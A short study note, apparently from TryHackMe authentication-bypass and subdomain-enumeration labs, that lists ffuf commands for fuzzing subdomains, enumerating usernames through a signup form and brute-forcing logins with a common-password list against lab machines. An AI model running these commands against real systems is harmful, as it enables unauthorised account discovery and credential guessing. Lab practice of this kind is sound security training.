> [!info] LINK & TAG
> [TryHackMe | Authentication Bypass](https://tryhackme.com/room/authenticationbypass)
> [TryHackMe | Subdomain Enumeration](https://tryhackme.com/room/subdomainenumeration)
> [ffuf/ffuf: Fast web fuzzer written in Go](https://github.com/ffuf/ffuf)
> 
> #Linux #cybersecurity #shell 


```sh
user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://MACHINE_IP


user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://MACHINE_IP -fs [size]

# Username Enumeration
# FUZZ is for ffuf content
user@tryhackme$ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.49.187.100/customers/signup -mr "username already exists"

# W1:wordlist 1
# W2:wordlist 2
user@tryhackme$ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.49.187.100/customers/login -fc 200
```